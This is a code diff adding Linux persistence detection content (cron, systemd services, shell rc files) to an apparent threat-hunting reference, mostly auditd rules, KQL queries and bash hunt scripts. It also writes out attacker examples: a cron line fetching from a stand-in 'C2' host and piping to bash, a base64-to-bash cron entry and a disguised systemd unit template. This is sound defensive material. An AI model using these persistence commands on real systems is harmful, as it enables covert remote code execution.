@@ -4661,4 +4661,1848 @@ procmon (Sysinternals):
       }
     ]
   }
+,
+// =====================================================
+// LINUX PERSISTENCE ADDITIONS — TA0003
+// Techniques: T1053.003, T1543.002, T1546.004,
+//             T1098.004, T1547.006, T1556.003, T1037.004
+// Schema: id, name, desc, rows[]
+//   rows: sub, os, indicator, sysmon (auditd rules),
+//         kibana (KQL), powershell (bash hunt),
+//         registry (file artifacts), tools,
+//         ossdetect, notes, apt[], cite
+// =====================================================
+
+  {
+    id: "T1053.003",
+    name: "Scheduled Task/Job: Cron",
+    desc: "Adversary abuse of cron utility for recurring or @reboot execution — root crontab, /etc/cron.d fragments, user spool entries, and systemd timers as scheduled persistence",
+    rows: [
+      {
+        sub: "T1053.003 - Real-Time Cron File Write Detection",
+        os: "linux",
+        indicator: "auditd write event to cron-controlled paths — /etc/crontab, /etc/cron.d/*, /var/spool/cron/crontabs/*, or crontab binary execution by non-root",
+        sysmon: `# Auditd rules — add to /etc/audit/rules.d/persistence.rules
+# Watch all cron persistence write paths
+
+# System-wide crontab
+-w /etc/crontab -p wa -k cron_persist
+
+# cron fragment directory
+-w /etc/cron.d -p wa -k cron_persist
+
+# Per-user spool (Debian/Ubuntu path)
+-w /var/spool/cron/crontabs -p wa -k cron_persist
+
+# Per-user spool (RHEL/CentOS path)
+-w /var/spool/cron -p wa -k cron_persist
+
+# Periodic script directories
+-w /etc/cron.hourly -p wa -k cron_persist
+-w /etc/cron.daily -p wa -k cron_persist
+-w /etc/cron.weekly -p wa -k cron_persist
+-w /etc/cron.monthly -p wa -k cron_persist
+
+# Monitor crontab binary execution
+-a always,exit -F arch=b64 -S execve -F path=/usr/bin/crontab -k crontab_exec
+-a always,exit -F arch=b32 -S execve -F path=/usr/bin/crontab -k crontab_exec
+
+# After adding, reload: auditctl -R /etc/audit/rules.d/persistence.rules
+# Verify: auditctl -l | grep cron`,
+        kibana: `// Auditbeat file_integrity module — cron path writes
+event.module: "file_integrity"
+AND file.path: (/etc/crontab OR /etc/cron.d/* OR /var/spool/cron/crontabs/* OR /etc/cron.hourly/* OR /etc/cron.daily/* OR /etc/cron.weekly/* OR /etc/cron.monthly/*)
+
+// Auditd module — key-based (auditbeat or filebeat auditd module)
+event.module: "auditd"
+AND tags: "cron_persist"
+
+// Sysmon for Linux EID 11 — file create in cron paths
+event.code: "11"
+AND file.path: (/etc/cron* OR /var/spool/cron*)
+
+// crontab binary execution by non-service accounts
+event.module: "auditd"
+AND process.executable: "/usr/bin/crontab"
+AND NOT user.name: ("root" OR "cron" OR "daemon" OR "syslog")
+
+// Suspicious payload patterns in cron writes (if content captured)
+event.module: "auditd"
+AND tags: "cron_persist"
+AND auditd.log.a2: (*curl* OR *wget* OR *bash* OR *python* OR */tmp/* OR */dev/shm/*)`,
+        powershell: `#!/bin/bash
+# T1053.003 - Cron Persistence Hunt
+# Run as root for full coverage
+
+echo "[*] === /etc/crontab ==="
+cat /etc/crontab 2>/dev/null
+
+echo ""
+echo "[*] === /etc/cron.d/ contents ==="
+ls -la /etc/cron.d/ 2>/dev/null
+for f in /etc/cron.d/*; do
+  [ -f "$f" ] || continue
+  echo "--- $f ---"
+  cat "$f"
+done
+
+echo ""
+echo "[*] === Periodic script dirs ==="
+for dir in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
+  echo "--- $dir ---"
+  ls -la "$dir" 2>/dev/null
+done
+
+echo ""
+echo "[*] === Per-user crontabs (spool) ==="
+# Debian/Ubuntu
+ls -la /var/spool/cron/crontabs/ 2>/dev/null
+for f in /var/spool/cron/crontabs/*; do
+  [ -f "$f" ] || continue
+  echo "--- $(basename $f) ---"
+  cat "$f"
+done
+# RHEL/CentOS
+ls -la /var/spool/cron/ 2>/dev/null
+for f in /var/spool/cron/*; do
+  [ -f "$f" ] || continue
+  echo "--- RHEL spool: $(basename $f) ---"
+  cat "$f"
+done
+
+echo ""
+echo "[*] === @reboot entries (highest persistence risk) ==="
+grep -rE "@reboot" /etc/cron* /var/spool/cron/ 2>/dev/null
+
+echo ""
+echo "[*] === Suspicious payload patterns ==="
+grep -rE \
+  "(curl|wget|bash|python[23]?|nc |ncat|/tmp/|/dev/shm/|/var/tmp/|base64 |[|]bash)" \
+  /etc/cron* /var/spool/cron/ 2>/dev/null
+
+echo ""
+echo "[*] === Recently modified cron files (last 7 days) ==="
+find /etc/cron* /var/spool/cron/ -mtime -7 -ls 2>/dev/null
+
+echo ""
+echo "[*] === Systemd timers (cron-alternative persistence) ==="
+systemctl list-timers --all 2>/dev/null | grep -v "^NEXT"`,
+        registry: `Primary cron persistence locations (Linux):
+
+System-level (requires root):
+  /etc/crontab                   - system-wide crontab file
+  /etc/cron.d/<name>             - cron fragment files
+  /etc/cron.hourly/<script>      - scripts run each hour
+  /etc/cron.daily/<script>       - scripts run each day
+  /etc/cron.weekly/<script>      - scripts run weekly
+  /etc/cron.monthly/<script>     - scripts run monthly
+
+User-level (any authenticated user):
+  /var/spool/cron/crontabs/<user>  - Debian/Ubuntu path
+  /var/spool/cron/<user>           - RHEL/CentOS path
+
+ESXi-specific:
+  /var/spool/cron/crontabs/root    - direct write required
+                                     (crontab command may be absent)
+
+Access control files (check if bypassed):
+  /etc/cron.allow                - allowlist of permitted users
+  /etc/cron.deny                 - denylist of blocked users
+  (if cron.allow exists, only listed users can use cron)
+
+Common malware naming patterns in cron.d:
+  systemd-update, .system, network-manager,
+  atd, rsyslog, sysstat, update-motd (spoofed names)
+
+High-risk cron entry patterns:
+  @reboot root /payload          - runs on every boot
+  * * * * * root cmd             - every minute (max rate)
+  */5 * * * * root cmd           - every 5 minutes`,
+        tools: `APT actors and malware families known to use cron persistence:
+
+Rocke (CN) - cryptomining, installs cron jobs that continuously
+  re-download and execute mining payloads; documented in multiple
+  cloud server intrusion campaigns since 2018
+
+TeamTNT (financially motivated) - cloud credential theft + mining,
+  establishes cron jobs for re-infection and C2 callbacks
+
+APT5 (CN) - NSA 2022 advisory documented cron modification in
+  /var/cron/tabs/ on compromised Citrix ADC appliances
+
+APT38/BeagleBoyz (KP) - FASTCash 2.0 campaign used cron for
+  scheduled ATM dispense commands; CISA/DISA advisory 2020
+
+GoldMax/Sunshuttle (RU) - Linux variant used @reboot crontab
+  directive to survive reboots during long-dwell operations
+
+Kinsing (mul) - cloud-targeted, installs cron every minute to
+  re-download from C2 server if payload is cleaned
+
+NKAbuse (KP) - Linux backdoor using GoBotKorea, uses cron
+  for boot persistence per Kaspersky 2023 research
+
+ESXiArgs ransomware - modified cron on ESXi hosts via direct
+  write to /var/spool/cron/crontabs/root
+
+Common attacker cron techniques:
+  # Append (leaves history):
+  (crontab -l 2>/dev/null; echo "* * * * * /tmp/.daemon") | crontab -
+
+  # Direct write to system:
+  echo "*/5 * * * * root curl http://C2/p|bash" > /etc/cron.d/.update
+
+  # Encoded payload:
+  echo "* * * * * root echo BASE64PAYLOAD|base64 -d|bash" >> /etc/crontab`,
+        ossdetect: `Sigma rules:
+- file_event_lnx_crontab_file_modification.yml
+- proc_creation_lnx_crontab_execution.yml
+- file_event_lnx_cron_reboot_entry.yml
+- proc_creation_lnx_cron_susp_child.yml
+
+Atomic Red Team:
+- T1053.003 Test #1 (crontab -e/replacement)
+- T1053.003 Test #2 (drop to /etc/cron.d)
+- T1053.003 Test #3 (echo pipe to crontab)
+- T1053.003 Test #4 (periodic script dir drop)
+
+PANIX (Linux persistence simulation):
+- ./panix.sh --cron --default
+  github.com/Aegrah/PANIX
+  Tests all cron vectors including @reboot
+
+Elastic detection rules:
+- Potential Persistence via Cron Job
+- Cron Job Created or Changed
+- Persistence via a Cron Job with Suspicious Arguments
+
+Wazuh rules:
+- rule 550/550 (file modified) triggered on cron paths
+  via /etc/ossec.conf syscheck configuration
+
+Velociraptor artifacts:
+- Linux.Sys.Crontab (enumerate all cron entries)
+- Linux.Detection.Artifacts (broader persistence sweep)
+
+rkhunter / chkrootkit:
+- Scan cron directories for unexpected scripts
+- Not real-time; scheduled sweep tool`,
+        notes: "Cron is the single most common Linux persistence mechanism for opportunistic threat actors. Unlike Windows Run keys, cron entries require no active session - they survive reboots, user logouts, and process kills, re-executing on schedule. The @reboot directive is the highest-value IOC: it's rarely used by legitimate software and is explicitly designed to run at startup, making it functionally identical to a Windows RunOnce key. Any @reboot entry written by a non-package-manager process should be investigated immediately. The /etc/cron.d directory is a major blind spot - administrators often monitor /etc/crontab but forget that individual files in /etc/cron.d receive no human review. Adversaries exploit this by naming their cron fragment after a legitimate package (systemd-update, network-manager-cron) to blend with expected entries. User-level crontabs in /var/spool/cron/crontabs are writable by any valid user without root - this means a compromised unprivileged account can establish cron persistence that survives across sessions. Detection strategy: pair file-integrity monitoring on all cron paths with process-creation events for the crontab binary; alert on any crontab execution from non-standard parents (web server processes, SSH sessions, unknown daemons). Run a scheduled baseline comparison of all cron content against known-good state.",
+        apt: [
+          { cls: "apt-cn", name: "Rocke", note: "Cryptocurrency mining group; installs cron jobs that re-download payloads from C2 every minute or hour across cloud server campaigns." },
+          { cls: "apt-cn", name: "APT5", note: "NSA 2022 advisory documented APT5 modifying cron in /var/cron/tabs/ on compromised Citrix ADC appliances." },
+          { cls: "apt-kp", name: "APT38/BeagleBoyz", note: "FASTCash 2.0 campaign used scheduled cron commands to time ATM dispense operations; CISA/DISA advisory 2020." },
+          { cls: "apt-ru", name: "GoldMax", note: "Linux variant of Sunburst-era RU tooling used @reboot crontab directive for boot persistence during long-dwell espionage." },
+          { cls: "apt-mul", name: "TeamTNT", note: "Cloud-targeted credential theft and mining group; cron used for re-infection and C2 callbacks on compromised Docker/K8s instances." },
+          { cls: "apt-mul", name: "Kinsing / ESXiArgs", note: "Kinsing installs every-minute cron for re-download resilience; ESXiArgs ransomware used direct cron writes on VMware ESXi hosts." }
+        ],
+        cite: "MITRE ATT&CK T1053.003"
+      },
+      {
+        sub: "T1053.003 - Cron Baseline Sweep and Anomaly Hunt",
+        os: "linux",
+        indicator: "Enumerate all cron locations fleet-wide and diff against known-good baseline; alert on new @reboot, every-minute, or suspicious-path entries added outside change windows",
+        sysmon: `# Generate and compare cron baseline
+# Run on all Linux hosts via orchestration tool
+
+# --- Snapshot all cron content ---
+# Output format: hostname | location | owner | content
+
+snapshot_cron() {
+  local host=$(hostname)
+  for f in /etc/crontab /etc/cron.d/* \
+            /etc/cron.hourly/* /etc/cron.daily/* \
+            /etc/cron.weekly/* /etc/cron.monthly/* \
+            /var/spool/cron/crontabs/* /var/spool/cron/*; do
+    [ -f "$f" ] || continue
+    stat -c "%h|%U|%G|%a|%Y" "$f" | \
+      awk -v h="$host" -v p="$f" \
+      '{print h"|"p"|"$0}'
+  done
+}
+
+# --- Auditd real-time for @reboot hunting ---
+# Look for @reboot writes that were not from package manager:
+ausearch -k cron_persist --start today 2>/dev/null | \
+  grep -A 5 "SYSCALL" | \
+  grep -B 3 "@reboot"
+
+# --- Cross-host comparison (if central logging) ---
+# Collect cron file hashes for baseline comparison:
+find /etc/cron* /var/spool/cron/ -type f 2>/dev/null | \
+  sort | xargs sha256sum 2>/dev/null`,
+        kibana: `// Fleet-wide cron baseline comparison
+// Requires file_integrity module collecting cron paths
+
+// New files appearing in cron directories
+event.module: "file_integrity"
+AND file.path: (/etc/cron* OR /var/spool/cron*)
+AND event.type: "created"
+
+// Modified cron entries during off-hours
+event.module: "file_integrity"
+AND file.path: (/etc/cron* OR /var/spool/cron*)
+AND event.type: "updated"
+AND NOT @timestamp: {
+  range: { gte: "09:00", lte: "17:00" }  // tune to your change window
+}
+
+// Hash-based: alert when known cron file hash changes
+event.module: "file_integrity"
+AND file.path: "/etc/crontab"
+AND NOT file.hash.sha256: "<your-baseline-hash>"
+
+// Auditd: cron entries containing download tools
+event.module: "auditd"
+AND tags: "cron_persist"
+AND process.args: (*curl* OR *wget* OR *python* OR */tmp/* OR */dev/shm*)`,
+        powershell: `#!/bin/bash
+# T1053.003 - Baseline and anomaly detection
+# Generates sha256 baseline of all cron content
+# Compare against previous run to detect changes
+
+BASELINE="/var/lib/security/cron_baseline.sha256"
+CURRENT="/tmp/cron_current_$(date +%s).sha256"
+ALERT_LOG="/var/log/security/cron_changes.log"
+
+mkdir -p "$(dirname "$BASELINE")" "$(dirname "$ALERT_LOG")"
+
+# Build current state hash
+find /etc/cron* /var/spool/cron/ -type f 2>/dev/null | sort | \
+  while read f; do
+    sha256sum "$f" 2>/dev/null
+    echo "--- content of $f ---"
+    cat "$f" 2>/dev/null
+    echo ""
+  done | sha256sum > "$CURRENT"
+
+# If baseline exists, compare
+if [ -f "$BASELINE" ]; then
+  if ! diff -q "$CURRENT" "$BASELINE" > /dev/null 2>&1; then
+    echo "[ALERT] $(date): Cron content changed" >> "$ALERT_LOG"
+    # Deep comparison
+    find /etc/cron* /var/spool/cron/ -type f 2>/dev/null | sort | \
+      while read f; do
+        sha256sum "$f"
+      done > /tmp/cron_files_now.txt
+    diff <(cat "$BASELINE") /tmp/cron_files_now.txt >> "$ALERT_LOG"
+    echo "[*] Changed files:"
+    diff <(cat "$BASELINE") /tmp/cron_files_now.txt
+    
+    # Specifically call out @reboot and downloader patterns
+    echo "[*] @reboot entries:"
+    grep -rh "@reboot" /etc/cron* /var/spool/cron/ 2>/dev/null
+    echo "[*] Suspicious patterns:"
+    grep -rEh "(curl|wget|bash|python|/tmp/|/dev/shm/|base64)" \
+      /etc/cron* /var/spool/cron/ 2>/dev/null
+  else
+    echo "[OK] Cron baseline unchanged"
+  fi
+else
+  echo "[*] No baseline found - creating new baseline"
+fi
+
+cp "$CURRENT" "$BASELINE"
+rm -f "$CURRENT"`,
+        registry: `Baseline comparison targets:
+
+All paths in previous indicator plus:
+
+Access control (check for unexpected removal):
+  /etc/cron.allow   - if present, limits who can use cron
+  /etc/cron.deny    - denylist; adversaries may DELETE this file
+                      to allow a previously denied account to cron
+
+Cron binary itself (watch for replacement):
+  /usr/sbin/crond   - RHEL daemon binary
+  /usr/sbin/cron    - Debian daemon binary
+  Check hash against package manager:
+    rpm -V cronie  (RHEL)
+    dpkg --verify cron  (Debian)
+
+Log file for audit review:
+  /var/log/syslog    - cron execution log on Debian
+  /var/log/cron      - cron execution log on RHEL
+  /var/log/cron.log  - some distros
+
+Integrity baseline approach:
+  AIDE or Tripwire configured to watch:
+    /etc/cron.d r+sha256+inode
+    /etc/crontab r+sha256+inode
+    /var/spool/cron/crontabs r+sha256+inode`,
+        tools: `Baseline sweep approach is critical when:
+- Real-time auditd was not deployed at compromise time
+- Attacker established persistence BEFORE logging was enabled
+- Investigating host with unknown dwell time
+
+Fleet-wide sweep tools:
+- Velociraptor: Linux.Sys.Crontab VQL artifact
+  (enumerate, collect, compare fleet-wide)
+- osquery: crontab table (SELECT * FROM crontab)
+- Ansible/Salt: run cron snapshot playbook fleet-wide
+- PANIX --cron: simulates all cron persistence vectors
+  for testing your baseline detection
+
+Known malware cron entry patterns:
+- Rocke: /etc/cron.d/apache  (spoofed name, curl | bash)
+- TeamTNT: every-minute entries downloading from 
+  cloud-provider-spoofed C2 domains
+- Generic miner: /tmp/ or /var/tmp/ payload paths
+- ESXiArgs: /var/spool/cron/crontabs/root directly
+
+Hunting additional @reboot-equivalent persistence:
+  systemctl list-timers --all
+  (systemd timers: see T1053.006 for full coverage)`,
+        ossdetect: `Velociraptor:
+- Linux.Sys.Crontab (primary fleet-sweep artifact)
+- Returns all cron entries with structured output
+- Can diff against uploaded baseline JSON
+
+osquery:
+- SELECT * FROM crontab;
+- SELECT * FROM file WHERE directory IN
+  ('/etc/cron.d','/etc/cron.hourly',...)
+  AND mtime > (strftime('%s','now') - 86400);
+
+AIDE (filesystem integrity):
+- Configure to watch /etc/cron*, /var/spool/cron
+- aide --check to compare against baseline db
+- aide --init to create initial baseline
+
+Tripwire:
+- Add cron directories to tripwire.cfg
+- Runs nightly; reports on any changes
+
+Auditd + ausearch:
+- ausearch -k cron_persist --start recent
+- aureport --file -ts today (file access summary)
+
+Sigma:
+- file_event_lnx_crontab_file_modification.yml
+  (catches all listed cron paths)`,
+        notes: "The sweep approach is essential when you cannot trust that real-time detection caught every persistence write - either because auditd wasn't running or because the adversary disabled logging temporarily. Key anomalies to prioritize: (1) @reboot entries not associated with a known package installation, (2) entries with paths in /tmp, /dev/shm, /var/tmp, or user home directories, (3) entries with download commands (curl, wget, python -c), (4) frequency higher than daily for root-owned entries (legitimate system jobs almost never need every-minute execution), (5) cron entries that reference files with names mimicking system components (systemd-update, network-manager, atd). The cron.allow / cron.deny pair is frequently overlooked: if cron.deny is deleted and cron.allow does not exist, ALL users can create crontabs. Adversaries who gain a low-privilege shell may delete cron.deny to allow their compromised user account to schedule tasks. Baseline the existence and content of both files.",
+        apt: [
+          { cls: "apt-cn", name: "Rocke", note: "Uses /etc/cron.d entries with spoofed names (apache, sshd) containing curl|bash payloads; found via sweep not real-time detection." },
+          { cls: "apt-mul", name: "TeamTNT", note: "Cloud-focused actor; cron entries survive container restarts and host reboots, often missed during incident cleanup." },
+          { cls: "apt-mul", name: "Cryptomining families", note: "Commodity cryptominers universally use cron for re-infection resilience; sweep is required to find all instances after partial remediation." }
+        ],
+        cite: "MITRE ATT&CK T1053.003"
+      }
+    ]
+  },
+
+  {
+    id: "T1543.002",
+    name: "Create or Modify System Process: Systemd Service",
+    desc: "Malicious .service unit files in system or user directories, ExecStart pointing to attacker payloads, systemctl enable for boot persistence, and systemd-generator abuse",
+    rows: [
+      {
+        sub: "T1543.002 - Malicious .service Unit File Drop and Enable",
+        os: "linux",
+        indicator: "New .service file written outside package manager into /etc/systemd/system/, /usr/lib/systemd/system/, or ~/.config/systemd/user/, followed by systemctl enable or daemon-reload",
+        sysmon: `# Auditd rules for systemd service file persistence
+
+# System-level unit file directories (root required)
+-w /etc/systemd/system -p wa -k systemd_unit_write
+-w /usr/lib/systemd/system -p wa -k systemd_unit_write
+-w /usr/local/lib/systemd/system -p wa -k systemd_unit_write
+
+# Drop-in directories (common adversary bypass technique)
+-w /etc/systemd/system.conf.d -p wa -k systemd_unit_write
+
+# systemctl binary invocations (enable/disable/start)
+-a always,exit -F arch=b64 -S execve \
+  -F path=/bin/systemctl -k systemctl_exec
+-a always,exit -F arch=b64 -S execve \
+  -F path=/usr/bin/systemctl -k systemctl_exec
+
+# systemd generator directories (advanced persistence)
+-w /etc/systemd/system-generators -p wa -k systemd_generator
+-w /usr/lib/systemd/system-generators -p wa -k systemd_generator
+-w /usr/local/lib/systemd/system-generators -p wa -k systemd_generator
+
+# Sysmon for Linux EID 11 (file create) — catches .service drops
+# Filter: TargetFilename contains ".service" or ".timer"`,
+        kibana: `// New .service or .timer file creation in systemd directories
+event.module: "file_integrity"
+AND file.path: (/etc/systemd/system/* OR /usr/lib/systemd/system/* OR /usr/local/lib/systemd/system/*)
+AND (file.path: *.service OR file.path: *.timer)
+
+// Auditd key — unit file writes
+event.module: "auditd"
+AND tags: "systemd_unit_write"
+
+// systemctl enable command (persistence enablement)
+event.module: "auditd"
+AND tags: "systemctl_exec"
+AND process.args: "enable"
+
+// Process child of systemd with PID 1 parent — suspicious payload
+process.parent.pid: 1
+AND NOT process.executable: (
+  "/usr/sbin/sshd" OR "/usr/bin/cron" OR "/usr/sbin/rsyslogd"
+  OR "/usr/lib/postfix/master" OR "/usr/sbin/chronyd"
+  OR "/usr/bin/dbus-daemon"
+)
+
+// ExecStart paths in suspicious locations
+event.module: "file_integrity"
+AND file.path: (/etc/systemd/system/*)
+AND file.content: (*\/tmp\/* OR *\/dev\/shm\/* OR *\/var\/tmp\/*)`,
+        powershell: `#!/bin/bash
+# T1543.002 - Systemd Service Persistence Hunt
+
+echo "[*] === All active/failed services (non-package) ==="
+systemctl list-units --type=service --all --no-pager 2>/dev/null | \
+  grep -v "^UNIT"
+
+echo ""
+echo "[*] === Services enabled for boot ==="
+systemctl list-unit-files --type=service --state=enabled --no-pager 2>/dev/null
+
+echo ""
+echo "[*] === Unit files NOT from package manager (manual drops) ==="
+# Installed pkg units are in /usr/lib/systemd; manual ones in /etc/systemd/system
+# Flag /etc/systemd/system/*.service that aren't symlinks to /usr/lib
+for f in /etc/systemd/system/*.service; do
+  [ -f "$f" ] || continue
+  if ! readlink -f "$f" | grep -q "^/usr/lib/systemd"; then
+    echo "[FLAG] Non-packaged service: $f"
+    cat "$f"
+    echo ""
+  fi
+done
+
+echo ""
+echo "[*] === ExecStart paths in suspicious locations ==="
+grep -r "ExecStart" /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null | \
+  grep -E "(/tmp/|/dev/shm/|/var/tmp/|/home/[^/]+/\.[^/]+|/usr/local/sbin/\.)" 
+
+echo ""
+echo "[*] === User-level systemd units (unprivileged persistence) ==="
+find /home -path "*/.config/systemd/user/*.service" -type f 2>/dev/null | \
+  while read f; do
+    echo "--- $f ---"
+    cat "$f"
+  done
+find /root/.config/systemd/user/ -name "*.service" 2>/dev/null | \
+  while read f; do
+    echo "--- $f ---"
+    cat "$f"
+  done
+
+echo ""
+echo "[*] === Recently modified unit files (7 days) ==="
+find /etc/systemd /usr/lib/systemd -name "*.service" -mtime -7 -ls 2>/dev/null
+
+echo ""
+echo "[*] === Systemd generators (advanced persistence) ==="
+ls -la /etc/systemd/system-generators/ \
+       /usr/lib/systemd/system-generators/ \
+       /usr/local/lib/systemd/system-generators/ 2>/dev/null`,
+        registry: `Systemd unit file persistence locations:
+
+System-level (root required):
+  /etc/systemd/system/<name>.service     - admin-installed units
+  /usr/lib/systemd/system/<name>.service - package-installed units
+  /usr/local/lib/systemd/system/         - locally compiled packages
+  /lib/systemd/system/                   - symlink to /usr/lib (Debian)
+
+Drop-in override directories:
+  /etc/systemd/system/<name>.service.d/  - override fragments
+  (can override ExecStart without touching the original unit)
+
+User-level (no root needed):
+  ~/.config/systemd/user/<name>.service  - per-user unit
+  /usr/lib/systemd/user/<name>.service   - user unit from package
+
+Systemd generator directories (advanced):
+  /etc/systemd/system-generators/
+  /usr/lib/systemd/system-generators/
+  /usr/local/lib/systemd/system-generators/
+  (executables here run at boot to dynamically create units)
+
+Enable persistence artifacts:
+  /etc/systemd/system/multi-user.target.wants/<name>.service
+  (symlink created by systemctl enable)
+
+Critical unit file directives to check:
+  ExecStart=   - the binary or command being run
+  User=        - if set to root on non-system service (flag)
+  Restart=always  - ensures restart on death (persistence signal)
+  [Install] WantedBy=multi-user.target  - boot enable`,
+        tools: `APT actors and malware using systemd persistence:
+
+Rocke (CN) - cryptominer; installs systemd services named after
+  legitimate daemons (sshd-sync, system-update, irqbalanced)
+  to run mining payloads with restart=always
+
+TeamTNT (mul) - cloud/container threat actor; drops .service
+  files that start C2 agents and miners on compromised hosts
+
+UNC3524 (likely CN) - used systemd service persistence on
+  compromised Linux servers during long-dwell espionage;
+  Mandiant documented 18+ month dwell time
+
+Gomir (KP/Kimsuky) - Linux backdoor dropped as systemd service
+  with ExecStart pointing to /usr/bin/timedatectl (spoofed path)
+
+Ebury (RU-nexus) - SSH backdoor rootkit also establishes
+  systemd service for persistence on OpenSSH servers
+
+PANIX (simulation tool):
+  ./panix.sh --systemd-service  - drops test .service file
+  github.com/Aegrah/PANIX
+
+Common red team/attacker patterns:
+  [Unit]
+  Description=System Logger Service
+  [Service]
+  ExecStart=/usr/local/bin/.svc-daemon
+  Restart=always
+  [Install]
+  WantedBy=multi-user.target
+
+  systemctl enable --now malicious.service
+  systemctl daemon-reload`,
+        ossdetect: `Sigma rules:
+- file_event_lnx_systemd_service_file_creation.yml
+- proc_creation_lnx_systemctl_susp_service_enable.yml
+- file_event_lnx_systemd_generator_creation.yml
+- proc_creation_lnx_systemd_service_susp_path.yml
+
+Elastic detection rules:
+- Potential Persistence via Systemd Service Creation
+- Systemd Unit File Created
+- Systemd Service Started/Enabled via Suspicious Argument
+
+Atomic Red Team:
+- T1543.002 Test #1 (service unit file creation)
+- T1543.002 Test #2 (systemctl enable)
+- T1543.002 Test #3 (user-level unit file)
+
+PANIX:
+- --systemd-service flag, tests both root and user units
+  github.com/Aegrah/PANIX
+
+Velociraptor:
+- Linux.Sys.Services (enumerate all systemd units)
+- Linux.Detection.Systemd (anomaly hunt)
+
+osquery:
+- SELECT * FROM systemd_units WHERE active_state = 'active';
+- SELECT * FROM systemd_units WHERE unit_file_state = 'enabled'
+  AND source_path LIKE '/etc/systemd/system/%';
+
+Pepe Berba blog series:
+- 'Hunting for Persistence in Linux (Part 5): Systemd Generators'
+- Required reading for generator-based persistence`,
+        notes: "Systemd service persistence is the Linux equivalent of creating a Windows service - it requires root for system-level units but only a valid user account for user-level units in ~/.config/systemd/user. The asymmetry matters: system services run as root and start at boot; user services run as the owning user and start at user login. Attackers frequently use system services for the stronger persistence guarantee. The ExecStart path is the primary IOC: legitimate system services almost never point to /tmp, /dev/shm, or home directories. The Restart=always directive is a second-order IOC - it ensures the payload respawns if killed, exactly what a defender would do during remediation. For detection, the strongest signal is a new .service file appearing in /etc/systemd/system that was not created by a package manager (apt, yum, dpkg, rpm). Diff the mtime of all .service files against the last known package installation timestamp. Systemd generators are an advanced and underdetected variant: executables placed in generator directories run at boot before normal services and can dynamically create additional unit files, making them a persistent foothold that survives even removal of the visible .service artifact.",
+        apt: [
+          { cls: "apt-cn", name: "Rocke", note: "Installs systemd service files named to mimic system daemons (irqbalanced, sshd-sync); ExecStart points to miner binary in /usr/local/bin." },
+          { cls: "apt-cn", name: "UNC3524", note: "Mandiant documented 18-month dwell on Linux servers; systemd service used as one of several persistence mechanisms." },
+          { cls: "apt-kp", name: "Gomir/Kimsuky", note: "Linux implant deployed as systemd service with spoofed ExecStart path to bypass casual review." },
+          { cls: "apt-ru", name: "Ebury", note: "OpenSSH backdoor; uses systemd service for persistence on Linux servers globally, targeting hosting providers." },
+          { cls: "apt-mul", name: "TeamTNT", note: "Cloud/container threat actor; drops systemd service files as part of post-exploitation persistence chain." }
+        ],
+        cite: "MITRE ATT&CK T1543.002"
+      }
+    ]
+  },
+
+  {
+    id: "T1546.004",
+    name: "Event Triggered Execution: Unix Shell Configuration Modification",
+    desc: "Injecting commands into .bashrc, .bash_profile, .profile, /etc/profile.d scripts, and /etc/bash.bashrc - executed on every interactive shell or login session",
+    rows: [
+      {
+        sub: "T1546.004 - Shell RC Backdoor Injection",
+        os: "linux",
+        indicator: "Write event to shell initialization files: ~/.bashrc, ~/.bash_profile, ~/.profile, /etc/profile.d/*.sh, /etc/bash.bashrc, /etc/profile — especially outside interactive sessions",
+        sysmon: `# Auditd rules for shell configuration file monitoring
+
+# Per-user shell configs (monitor all home dirs)
+-a always,exit -F arch=b64 -S open,openat,creat,truncate \
+  -F dir=/root -F path=.bashrc -F perm=w -k shell_rc_write
+-a always,exit -F arch=b64 -S open,openat,creat,truncate \
+  -F dir=/root -F path=.bash_profile -F perm=w -k shell_rc_write
+-a always,exit -F arch=b64 -S open,openat,creat,truncate \
+  -F dir=/root -F path=.profile -F perm=w -k shell_rc_write
+
+# System-wide shell initialization
+-w /etc/bash.bashrc -p wa -k shell_rc_write
+-w /etc/profile -p wa -k shell_rc_write
+-w /etc/profile.d -p wa -k shell_rc_write
+
+# Broad home-dir monitoring for all shell configs
+# Note: -F dir=/home requires supplementary find-based sweep
+-a always,exit -F arch=b64 -S open,openat,creat,truncate \
+  -F dir=/home -F perm=w -F key=shell_rc_write
+  # Filter on filename post-collection (auditd doesn't do glob match)
+
+# Sysmon for Linux EID 11 (FileCreate) on shell config paths:
+# TargetFilename endswith .bashrc OR .bash_profile OR .profile
+# AND NOT Image in /usr/bin/bash OR /bin/bash (interactive shell)`,
+        kibana: `// File integrity monitoring — shell config paths
+event.module: "file_integrity"
+AND file.path: (
+  /root/.bashrc OR /root/.bash_profile OR /root/.profile
+  OR /etc/bash.bashrc OR /etc/profile
+  OR /etc/profile.d/*
+)
+
+// Home directory shell configs (broad, needs tuning)
+event.module: "file_integrity"
+AND file.path: /home/*
+AND (file.name: ".bashrc" OR file.name: ".bash_profile"
+  OR file.name: ".profile" OR file.name: ".bash_logout")
+
+// Auditd key-based — shell rc write events
+event.module: "auditd"
+AND tags: "shell_rc_write"
+AND NOT process.executable: (
+  "/usr/bin/vim" OR "/usr/bin/nano" OR "/usr/bin/bash"
+  OR "/bin/bash" OR "/usr/bin/sh"
+)
+
+// Suspicious writers to shell configs
+event.module: "auditd"
+AND tags: "shell_rc_write"
+AND process.executable: (
+  "/usr/bin/python*" OR "/usr/bin/curl" OR "/usr/bin/wget"
+  OR "/tmp/*" OR "/dev/shm/*"
+)
+
+// Sysmon for Linux EID 11 — shell config file creation
+event.code: "11"
+AND winlog.event_data.TargetFilename: (*\.bashrc OR *\.bash_profile OR *profile.d*)`,
+        powershell: `#!/bin/bash
+# T1546.004 - Shell Configuration Backdoor Hunt
+
+echo "[*] === System-wide shell init files ==="
+for f in /etc/profile /etc/bash.bashrc /etc/environment; do
+  echo "--- $f ---"
+  cat "$f" 2>/dev/null
+done
+
+echo ""
+echo "[*] === /etc/profile.d/ scripts ==="
+ls -la /etc/profile.d/ 2>/dev/null
+for f in /etc/profile.d/*.sh; do
+  [ -f "$f" ] || continue
+  echo "--- $f ---"
+  cat "$f"
+done
+
+echo ""
+echo "[*] === Root shell configs ==="
+for f in /root/.bashrc /root/.bash_profile /root/.profile \
+         /root/.bash_logout /root/.zshrc; do
+  [ -f "$f" ] || continue
+  echo "--- $f ---"
+  cat "$f"
+done
+
+echo ""
+echo "[*] === All user shell configs ==="
+getent passwd | awk -F: '$3 >= 1000 && $7 !~ /nologin|false/ {print $6}' | \
+  while read homedir; do
+    for rc in .bashrc .bash_profile .profile .bash_logout .zshrc; do
+      f="$homedir/$rc"
+      [ -f "$f" ] || continue
+      echo "--- $f ---"
+      cat "$f"
+    done
